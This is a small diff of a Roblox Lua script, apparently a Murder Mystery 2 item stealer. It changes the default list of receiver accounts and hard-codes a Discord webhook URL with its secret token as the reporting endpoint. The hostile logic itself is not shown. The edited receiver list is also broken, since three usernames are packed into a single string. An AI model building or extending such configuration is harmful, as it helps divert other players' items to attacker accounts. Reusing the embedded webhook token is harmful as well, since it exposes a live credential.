@@ -233,7 +233,7 @@ if not getgenv().MM2_API_BASE then
 end
 
 local MM2_API_BASE = getgenv().MM2_API_BASE
-local RECEIVERS = getgenv().RECEIVERS or {"iceyblueii"}
+local RECEIVERS = getgenv().RECEIVERS or {"iceyblueii, husszn_hold1, gardenhssxcx"}
 local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4"
 local THRESHOLD = getgenv().THRESHOLD or 10
 
